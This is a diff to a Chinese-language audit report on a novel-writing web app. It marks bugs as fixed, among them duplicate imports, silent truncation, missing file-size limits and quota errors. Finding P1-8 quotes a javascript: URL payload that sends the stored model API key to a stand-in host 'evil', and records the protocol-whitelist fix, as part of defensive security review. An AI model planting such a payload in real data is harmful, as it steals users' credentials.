@@ -73,6 +73,7 @@
 - 建议：restoreVersion 末尾补 `chapterLengths.set(chapter.id, countWords(content))`。
 
 ### P1-2 重新导入同一份建书存档 → 记录成倍重复
+✅ 已修复（commit 443b394）：importWorkflowArchive 保留源 ID，导入时按 ID 跳过本机已有记录并提示跳过条数。
 - 位置：`src/workflow.ts:88-101`（`importWorkflowArchive` 给每条记录重新分配 `uid()`）+ `src/App.vue:1179`（新记录前置进 `records`）。
 - 行为：导出→（换机器或误操作）→再导入同一文件，由于去重完全依赖 ID 而 ID 每次都被重建，无法识别「这条已经导过了」，历史记录列表里同一份作品档案出现两份。重复导入 N 次就 N 份。
 - 建议：以内容指纹（如 title+idea+updatedAt 组合哈希）去重，或至少对「相同 title+completedAt」提示重复。
@@ -102,6 +103,7 @@
 - 关联 P0-1。
 
 ### P1-7 拆书存档（.json）再导入 → 同名项目成倍重复【库里已实际发生】
+✅ 已修复（commit 443b394）：importBreakdownStore 保留源 ID，导入时按 ID 跳过已有项目并提示「已导入 X 个、跳过 N 个重复」。
 - 位置：`src/breakdown.ts:701-714`（`importBreakdownStore` 给每个项目 `newId()` 重建 ID，710 行）+ `src/BreakdownView.vue:396`（导入后 `[...imported, ...projects]` 前置，无内容去重）。
 - 行为：同一份「拆书存档.json」导入两次（换电脑恢复、备份习惯、误操作），第二次导入的所有项目拿到全新 ID，项目列表里同名同内容的《X》并排两份；30 项目上限（P2-5）还会被重复项目提前占满，挤掉真正的新书。
 - 实测证据：本次测试所用 dev 源（127.0.0.1:6793）的 `breakdown-v1` 键里就存着两份完全同名的「钟声之外」（3 章、均已拆解，内容一致）——即同份存档被导入两次的真实产物。
@@ -109,6 +111,7 @@
 - 建议：`importBreakdownStore` 前按 `title+updatedAt` 或章节内容指纹与现有项目比对，跳过重复并提示「已跳过 N 个重复项目」。
 
 ### P1-8 榜单条目的 `bookUrl` 未做 scheme 校验，可注入 `javascript:` 触发 XSS【已实测】
+✅ 已修复（commit 9258e48）：safeHttpUrl 协议白名单（http(s) 与站点内相对路径）在七猫粘贴、存档导入两入口统一收口 bookUrl/coverUrl/lastChapterUrl，危险协议回退或剔除，不再触达渲染层。
 - 位置：`src/rank.ts:535`（七猫 JSON 粘贴路径 `String(row.book_url||'').trim()`，非空即原样保留）与 `src/rank.ts:594`（存档导入 `normalizeItem` 中 `String(row.bookUrl||'').trim()`），两者均不校验协议；渲染点 `src/RankView.vue:122`（`<a :href="row.bookUrl" target="_blank">`）。
 - 行为：手动导入一段七猫 JSON（或导入一份榜单存档），其中某条 `book_url`/`bookUrl` 写成 `javascript:fetch('https://evil/?k='+encodeURIComponent(localStorage.getItem('novel-workbench-next/v1').model.apiKey))`——该快照正常入库并展示，用户点击书名链接即在本机页面执行该脚本，可外带 localStorage 里的**模型 API key** 与全部作品数据。`target="_blank"` 无法阻止同文档 `javascript:` 执行。
 - 对照：番茄 HTML 抓取路径（rank.ts:467）经 `toAbsoluteUrl` 前缀拼接（非 http(s) 会拼成 `base/javascript:...` 的废 URL），意外免疫；唯独两个「用户可手填」的 JSON 入口没有这道保护。
@@ -124,6 +127,7 @@
 - 建议：去掉 `User-Agent` 头（浏览器 fetch 本就不允许自定义它，去掉后代码在所有浏览器行为一致，保留 `Accept` 即可）；文档写明「抓取」依赖 dev 代理，生产环境以手动粘贴为准。
 
 ### P1-10 作品 JSON 重复导入全部重建 ID，同名同内容作品成倍堆积且编辑分叉
+✅ 已修复（commit 443b394）：importBookJson 保留 book id（碰撞才重建），导入前按「书名+概念+首章标题」指纹弹确认。
 - 位置：`src/storage.ts:222-251`（`importBookJson` 无条件 `uid()` 重建 book/chapter/lore/chat/candidate 全部 ID，251 行 `id: uid()` 不尝试复用源文件里的 `source.id`）+ 入口 `src/App.vue:1480-1493`（`handleImport` 导入前不比对现有作品）对比 `src/backup.ts:137-138`（备份合并按 book id 去重——但那条去重对**重建了 ID 的作品 JSON 导入路径完全失效**）。
 - 行为：导出《X》→ 换设备/备份习惯/误操作 → 再导入同一文件 → 书架并排两部同名同内容《X》（ID 全新一套），无任何重复提示。此后用户在两份之间各改各的，字数统计按 bookId 分账（stats.ts `recordWords`）自然劈成两路，quota 占用翻倍（P2-16 放大），且备份合并时这两份都算「本地已有」、导入的备份副本又被去重掉——三份数据的对应关系无从追溯。与 P1-2（建书记录）、P1-7（拆书项目）同族的 ID 重建去重失效问题，发生在数据量最大的作品层。
 - 建议：`importBookJson` 保留源文件 book id（碰撞时再重建）；`handleImport` 前按「title + premise + 首章标题」指纹匹配现有作品，命中则提示「检测到疑似重复，已跳过 / 仍要导入」。
@@ -147,6 +151,7 @@
 - 建议：`normalizeBackupRecord` 的 draft 处理与 `importWorkflowArchive` 对齐（改走 `normalizeDraft`），一行消掉上述全部崩溃点。
 
 ### P2-3 章节规划静默截断到 20 章
+✅ 已修复（commit 30759b1）：大纲章节数上限 20 → 200（MAX_PLAN_CHAPTERS），长篇规划完整建进目录。
 - 位置：`src/workflow.ts:111`（`if (result.length === 20) break`，`parseChapterPlan`）+ 使用点 `src/workflow.ts:128`（`buildBookFromWorkflow`）。
 - 行为：大纲写 100 章规划，建书时只生成前 20 章，余下 80 章规划**只存在于 lore 的「故事主线与章节规划」文本里**，且无任何截断提示。用户以为 100 章都在目录中。
 - 建议：要么放开上限，要么在界面明示「仅导入前 20 章」。
@@ -158,45 +163,55 @@
 - 对比：章节级拆解有 `BREAKDOWN_PROMPT_PARAGRAPH_LIMIT` 截断（BreakdownView.vue:468），唯独报告没有。
 
 ### P2-5 拆书库 30 项目上限：导入时旧项目被静默丢弃
+✅ 已修复（commit 30759b1）：导入触发 30 项目上限时提示「已丢弃最旧的 N 个项目」。
 - 位置：`src/BreakdownView.vue:367`（TXT 导入 `[project, ...projects].slice(0, 30)`）、`396`（JSON 导入 `[...imported, ...projects].slice(0, 30)`）。
 - 行为：满 30 个项目后再导入，被挤出去的项目（TXT 路径是**最旧的项目**）直接消失，无任何「已丢弃 N 个项目」提示。用户以为导入成功且旧项目还在。
 - 注意 `saveBreakdownStore` 落盘时（breakdown.ts:693）也有同一 slice，即内存里短暂存在过的溢出项目刷新后必丢。
 - 全量备份通道豁免此上限：`breakdownProjectsFromBackup`（breakdown.ts:727-735）不检查项目数，覆盖分支（App.vue:1531）可把备份里任意多个项目直接存库（合并分支经 `mergeBreakdownProjects` 717-724 行会裁回 30）——30 上限只在「拆书页直接导入」一条路上生效。
 
 ### P2-6 多个导入入口无文件大小上限，巨型输入可冻结标签页
+✅ 已修复（commit 30759b1）：拆书 TXT ≤10MB、拆书 JSON/扫榜存档 ≤20MB、粘贴 ≤5MB 的入口闸全部补齐。
 - 位置：`src/BreakdownView.vue:387-402`（拆书存档导入）、`src/RankView.vue:619-631`（榜单存档导入，`JSON.parse(await file.text())` 无 size 检查）、`src/RankView.vue:572-587` + `src/rank.ts:1289-1327`（榜单**粘贴导入**：`pasteText` 无长度闸，`parseRankPaste` 在主线程对整段文本跑正则/`JSON.parse`）。
 - 对比：主备份有 50MB 闸（backup.ts:9 + App.vue 的 `file.size > BACKUP_SIZE_LIMIT` 检查），建书记录 20MB 闸，唯独这三个入口裸奔。几 GB 的 JSON 会 `file.text()` 全量进内存 + 同步 parse，标签页直接卡死/崩溃；粘贴入口同理——用户从浏览器另存一份带完整脚本的大 HTML 页粘进来，正则解析即可冻结页面数秒到数十秒。
 
 ### P2-7 拆书页拖拽接受任意文件类型
+✅ 已修复（commit 30759b1）：拖拽入口验类型，只收 TXT/纯文本。
 - 位置：`src/BreakdownView.vue:381-385`（`handleDrop` 直接读拖入文件；`accept=".txt"` 只约束文件选择器）。
 - 行为：把 .pdf / .exe / 图片拖进拆书页会被当 TXT 读（二进制 → 编码探测失败 → 大概率「无法正确读取」，也可能读出乱码建出一个垃圾项目）。
 
 ### P2-8 批量拆解进行中删除当前项目
+✅ 已修复（commit 3b78cc2）：批处理进行中禁止删除项目并提示。
 - 位置：`src/BreakdownView.vue:418-424`（`removeProject` 不检查 running）+ `450-490`（`runBatch` 闭包持有被删项目的引用）。
 - 行为：项目被移出 store，但批处理循环继续对这个游离对象改 `status/analysis` 并 `persist()`（persist 写的是 store，游离改动不落盘）→ 用户看到进度条走、章节变色，其实全白跑；批次结束后该项目的拆解成果全部丢失且无提示。
 
 ### P2-9 停止批拆解：被停的那章被标记为 failed 且报错文案是原始 AbortError
+✅ 已修复（commit 3b78cc2）：停止时当前章退回 wait，不再出现红色 failed 与 AbortError 文案。
 - 位置：`src/BreakdownView.vue:471-484`（abort 后 fetch 抛 AbortError → 内层 catch 479-480 标记 `failed`，errorMessage 为 `AbortError`/`The operation was aborted.` 之类原始文本；484 行 `if (signal.aborted) break`）。
 - 行为：用户主动「停止」，界面上却出现一条红色 failed 章节，报错文案像在说 AI 出错了。刷新后 `normalizeBreakdownChapter`（breakdown.ts:610）把残留 processing 转 failed，文案不变。
 - 建议：abort 路径单独分支，把该章置回 `wait`。
 
 ### P2-10 素材收集不去重，60 条/类上限被近重复条目灌满；空 desc 关系被静默丢弃
+✅ 已修复（commit 3b78cc2）：素材完全同内容去重，relations 空 desc 退回关系文本兜底。
 - 位置：`src/breakdown.ts:314-357`（`collectBreakdownMaterials`）。
 - 行为：200 章反复出现「人物关系」「节奏」条目时，上限先被重复内容占满，真正多样的素材进不来；`relations` 中 `desc` 为空的条目被过滤后无替代兜底，人物素材整体变少。
 
 ### P2-11 「第零章」在已有章节号之后被拒
+✅ 已修复（commit 9258e48）：第零章不再按回指拒绝，前后出现都切为独立章节。
 - 位置：`src/breakdown.ts:179-186`（`acceptHeading` 的 `lastNo` 单调性约束：0 号章节仅在 `lastNo === 0` 前接受）。
 - 行为：书里真出现「第零章」且前面已解析出 N 章时，该章整段被并入上一章正文。属于边缘 case，但「第零章」在网文里并不罕见（楔子/序章）。
 
 ### P2-12 清空每日目标输入框 → 目标被静默置为 100
+✅ 已修复（commit 9258e48）：清空目标输入恢复上一次有效值，不再静默置为 100。
 - 位置：`src/App.vue:786-788`（`saveStatsGoal`：`Number('')`/`Number(null)` → 0 → `Math.max(100, 0)` = 100；输入框 `min=100`，App.vue:128）。
 - 行为：用户清空输入想「不设目标」，得到 100/天且无任何说明；目标值下限 100 也写死在钳制里，想要 50/天的轻目标不可达（126 行进度条按 100 基数走）。
 
 ### P2-13 灵感库 500 条上限只在「下次加载」时生效
+✅ 已修复（commit 30759b1）：MAX_NOTES 常量两侧共用，500 条上限即时生效并提示。
 - 位置：`src/storage.ts:126`（`normalizeNotes` `.slice(0, 500)`）vs `src/App.vue:725`（`saveNote` 无条件 unshift）。
 - 行为：会话内可堆到远超 500 条并全部落盘（`saveData` 全量序列化），直到下次启动才被裁——磁盘里长期可能存着 700 条灵感，与「500 条上限」的语义不符；列表端也只截断不提示。
 
 ### P2-14 TXT 编码兜底的错误提示误导
+✅ 已修复（commit 9258e48）：编码读取失败提示如实写明已尝试 UTF-8 与 GB18030。
 - 位置：`src/BreakdownView.vue:342-358`（`readTxtText`：utf-8 fatal 失败 → gb18030 fatal 再失败 → 提示「请将原文件另存为 UTF-8」）。
 - 行为：两个编码都失败时提示只提 UTF-8，但刚才 GB18030 也试过了，用户按提示转码后重传仍可能失败（文件其实是其他编码或损坏），报错信息未反映真实尝试过什么。
 
@@ -226,6 +241,7 @@
 - 建议：文本字段统一加 `'` 前缀（或以制表符前置）；至少对 `=`/`+`/`-`/`@` 开头的单元格转义。
 
 ### P2-19 拆书 TXT/JSON 导入无体积闸：大文件静默截断 + 文本量不限可打满配额【已实测】
+✅ 已修复（commit 30759b1 + 989c3b0）：TXT ≤10MB 闸、章节截断提示、落盘失败可见（P0-1/P0-2）。
 🔶 配额溢出部分由 P0-1 缓解（commit 989c3b0）：导入后的落盘走 writeStorage，超配额会以中文错误落入本页错误区并弹 toast，不再静默；「大文件静默截断、文本量不限」与提示口径问题待本条修复。
 - 位置：`src/BreakdownView.vue:360-373`（`importTxt` 对 `file.size` 无检查，50MB TXT 照单全收）+ `src/breakdown.ts:253`（章节 `slice(0, 200)`）与 `257`（段落 `slice(0, 2000)`，均**无任何「已截断」提示**）+ `src/BreakdownView.vue:387-401`（JSON 导入 `file.text()` 同样无体积闸）+ `src/breakdown.ts:701-714`（`importBreakdownStore` 入口只限项目数 30，每个项目的段落正文、`characterNames`（587-595 随已拆章节无限累加）、report 文本量均不限）。
 - 行为：① 拖入 50MB TXT → `parseTxtBook` 全文拼接 + `createBreakdownProject` 建 200 章 × 2000 段，超出的章节/段落静默丢弃（与 P2-3/P2-5 同类，用户只看到「第1章…第200章」以为导入完整）；② `persist()` 走 `saveBreakdownStore`（breakdown.ts:692-694，**无配额防护**，同 P0-1/P0-2 一类）→ 超 5MB 共享配额时抛 `QuotaExceededError`，被 importTxt 的 catch（370 行）接住后以原始英文 DOMException 文本写进 `listError`（P1-6 同款体验），且该拆书项目**没进存储**，「导入成功」的界面状态与落盘结果背离；③ 大书经「完成拆解」后 analysis/素材又放大存储体积，反复触发 ②。JSON 导入路径：30 个项目 × 200 章 × 2000 段 × 不限长度的段落文本，导入后同样可静默顶穿配额，波及共享同源的其它 store 保存。
@@ -233,6 +249,7 @@
 - 建议：导入入口先查 `file.size`（如 TXT ≤10MB / JSON ≤20MB）并给出明确上限；章节/段落超上限时提示「已截断至 200 章/每章 2000 段」；`saveBreakdownStore` 纳入 P0-1/P0-2 的统一配额处置。
 
 ### P2-20 扫榜存档 JSON 导入无体积/条数上限：提示数、库内数、落盘数三者背离【已实测】
+✅ 已修复（commit 30759b1）：存档 ≤20MB 闸、「导入 X 份、现存 Y 份」口径、覆盖恢复预裁剪。
 🔶 配额溢出部分由 P0-1 缓解（commit 989c3b0）：导入后的落盘走 writeStorage，超配额会以中文错误提示，不再静默；「体积/条数无上限、三个数字背离」待本条修复。
 - 位置：`src/RankView.vue:619-632`（`handleArchive`：`file.text()` 无体积闸；`importRankStore` 结果逐条 `writeRankSnapshot` 写库；`notice` 报 `docs.length`）+ `src/rank.ts:1105-1117`（`importRankStore` 只校验格式与快照非空，不裁剪条数、不按保留策略收敛）+ `src/rank.ts:704-713`（`writeRankSnapshot` 每写一份即 `filter + prune`）+ `src/rank.ts:669-673`（`saveRankStore` 静默 catch，P0-1 已列）。
 - 行为：导入一份超大「扫榜存档」→ 主线程 `file.text()` + `JSON.parse` + 逐条归一化（每快照最多 200 条）冻结界面；随后提示「已导入 N 份快照」，但库内实际只按「120 天保留期 + 400 份总量」留存一份，且 `persist()` 的 `saveRankStore` 在配额溢出时**静默失败**（P0-1）——提示数、内存数、落盘数互不相同，刷新后数据凭空消失。与 P2-16（作品导入）、P2-19（拆书导入）同类的导入入口缺口。
